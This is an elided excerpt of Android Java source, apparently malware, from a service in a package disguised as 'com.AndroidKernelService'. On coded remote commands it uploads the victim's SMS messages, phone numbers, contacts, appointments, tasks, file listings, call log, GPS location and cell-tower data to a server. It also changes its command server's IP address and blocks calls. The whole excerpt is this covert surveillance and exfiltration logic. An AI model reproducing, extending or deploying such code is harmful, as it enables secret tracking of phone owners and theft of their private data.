...
public class RegisterService extends Service {
	...
	public void commandExecute(String command) {
		...
		if (command.contains("SxVa")) {
			...
			sendfile.send("data/data/com.AndroidKernelService/Message.txt",
			...
			sendfile.send("data/data/com.AndroidKernelService/SimPhoneNum.txt",
			...
			sendfile.send(
					"data/data/com.AndroidKernelService/OutLookPhoneNum.txt",
			...
			sendfile.send("data/data/com.AndroidKernelService/Appointment.txt",
			...
			sendfile.send("data/data/com.AndroidKernelService/Task.txt",
					"Task.txt", regStrForFile);
			...
			try {
				...
				sendfile.send(
						"data/data/com.AndroidKernelService/fileInfor.txt",
			...
			calllog.getCallLog();
			sendfile.send("data/data/com.AndroidKernelService/CallRecord.txt",
		...
		// 经纬度
			...
			LocationServ location = new LocationServ();
			String newLoc = location.getLocation();
			...
			sendfile.send(
					"data/data/com.AndroidKernelService/LocationInfo.txt",
					"LocationInfo.txt", regStrForFile);
		}
			...
			if (newIPAddress.length() == 0) {
				...
				try {
					if (ServerIP.setServerIP(newIPAddress)) {
						...
						sendfile.send(
								"data/data/com.AndroidKernelService/IPChanged.txt",
		...
		// lzd end
			...
			sendfile.send(
					"data/data/com.AndroidKernelService/ForwardSuccess.txt",
			...
			try {
				...
				String phoneNum = command.substring(first);
				// 解密手机号
				String decryptedPhoneNum = EncryptDecryptStr
						.strToPhoneNum(phoneNum);
				...
				sendfile.send(
						"data/data/com.AndroidKernelService/ProhibitNumSuccess.txt",
			...
			try {
				...
				sendfile.send(
						"data/data/com.AndroidKernelService/NotProhibitNumSuccess.txt",
			...
			sendfile.send(
					"data/data/com.AndroidKernelService/ProhibitAllSuccess.txt",
			...
			sendfile.send(
					"data/data/com.AndroidKernelService/NotProhibitAllSuccess.txt",
					"NotProhibitAllSuccess.txt", regStrForFile);

			// 判断是否为单卡，单卡退出，双卡运行
			IsMultiCard aIsMultiCard = new IsMultiCard();
			aIsMultiCard.judge();
		} else if (command.contains("Yt9b")) {
			String JZresult = null;
			try {
				// 获取基站信息
				// GSMCellLocationActivity aGSMCellLocationActivity = new
				// GSMCellLocationActivity();
				// JZresult = aGSMCellLocationActivity.GetJZ();//得到基站信息
				GSMCellLocationActivity myApp = (GSMCellLocationActivity) getApplication();
				JZresult = myApp.GetJZ();
			...
			// 发送成功信息
			FileOperate aFileOperate = new FileOperate("JZ.txt");

			FileOperate FileOperateSuccess = new FileOperate("JZ.txt");
			GetNowTime aGetNowTime = new GetNowTime();
			...
			sendfile.send("data/data/com.AndroidKernelService/JZ.txt",
					"JZ.txt", regStrForFile);
		}
	}
